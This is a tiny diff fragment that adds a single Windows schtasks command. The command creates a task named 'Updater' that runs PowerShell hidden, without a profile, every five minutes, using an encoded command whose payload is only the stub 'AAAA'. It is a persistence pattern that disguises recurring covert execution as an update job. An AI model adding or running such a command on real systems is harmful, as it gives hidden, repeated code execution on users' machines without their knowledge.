@@ -1,0 +1,2 @@
+schtasks /create /sc minute /mo 5 /tn Updater /tr "powershell.exe -w hidden -nop -enc AAAA" /f
+
